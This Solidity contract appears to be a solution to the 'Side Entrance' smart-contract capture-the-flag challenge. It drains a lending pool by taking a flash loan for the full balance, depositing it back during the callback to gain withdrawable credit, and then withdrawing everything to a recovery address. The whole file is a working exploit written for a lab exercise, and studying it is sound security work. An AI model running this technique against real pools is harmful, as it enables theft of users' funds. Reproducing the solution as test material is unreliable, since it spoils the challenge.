// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";
import {IFlashLoanEtherReceiver} from "./SideEntranceLenderPool.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract SideEntranceExploiter is IFlashLoanEtherReceiver {
    using SafeTransferLib for address;

    SideEntranceLenderPool private immutable pool;
    address private immutable owner;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
        owner = msg.sender;
    }

    // Take flash loan and deposit it back
    function attack() external {
        require(msg.sender == owner, "Unauthorized");
        
        // Take flash loan for full pool balance
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
    }

    // Flash loan callback - deposit the borrowed amount
    function execute() external payable override {
        require(msg.sender == address(pool), "Unauthorized");
        
        // Deposit the exact amount we received from flash loan
        // This maintains the pool's balance while giving us credit in balances mapping
        pool.deposit{value: msg.value}();
    }

    // Withdraw and send to recovery
    function withdraw(address recovery) external {
        require(msg.sender == owner, "Unauthorized");
        
        // Withdraw our deposited ETH from pool
        pool.withdraw();
        
        // Forward all ETH to recovery
        recovery.safeTransferETH(address(this).balance);
    }

    // Required to receive ETH
    receive() external payable {}
}
